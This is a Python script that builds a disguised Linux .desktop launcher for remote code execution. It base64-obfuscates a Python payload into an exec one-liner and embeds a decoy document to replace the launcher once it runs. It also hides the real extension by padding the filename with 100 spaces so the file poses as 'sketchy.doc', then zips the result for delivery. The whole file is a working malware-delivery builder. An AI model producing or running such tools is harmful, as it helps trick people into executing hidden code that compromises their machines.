#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import argparse
import base64
import zipfile

from jinja2 import Template


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create an executable .desktop file for RCE.")
    parser.add_argument("-c", "--desktop-template", metavar="DESKTOP_TEMPLATE",
                        help="Template containing the desktop file (default '%(default)s').",
                        default="desktop.tmpl", type=argparse.FileType('r'))

    parser.add_argument("-p", "--payload", metavar="PAYLOAD", type=argparse.FileType('r'),
                        help="Python code for the payload (default '%(default)s').",
                        default="payload.py")

    parser.add_argument("-d", "--decoy", metavar="DECOY", type=argparse.FileType('rb'),
                        help="Decoy file to replace the .desktop file (default '%(default)s').",
                        default="decoy.doc")

    parser.add_argument("-n", "--payload-name", metavar="PAYLOAD_FILENAME", type=str,
                        help="The name of the generated desktop file (default: '%(default)s')",
                        default="sketchy.doc")

    args = parser.parse_args()

    print("Creating malicious .desktop file\n---------")
    decoy_base64 = base64.b64encode(args.decoy.read())
    payload_base64 = base64.b64encode(args.payload.read())
    python_payload = "import base64; exec(base64.b64decode('{}'))".format(payload_base64)

    # Format the payload and create the .desktop file from the template.
    desktop_template = Template(args.desktop_template.read())
    desktop_file_content = desktop_template.render(python_payload=python_payload,
                                                   filename=args.payload_name,
                                                   decoy_data=decoy_base64)

    # Add spaces to filename to extension in archive
    desktop_file = args.payload_name + (" " * 100) + ".desktop"
    with open(desktop_file, "w") as payload:
        payload.write(desktop_file_content)
        os.chmod(desktop_file, 0o755)
        print("Wrote .desktop file to {}".format(desktop_file))

    zip_filename = "sketchy.zip"
    zipf = zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED)
    zipf.write(desktop_file)
    zipf.close()
    print("Wrote zip file containing desktop file to {}".format(zip_filename))
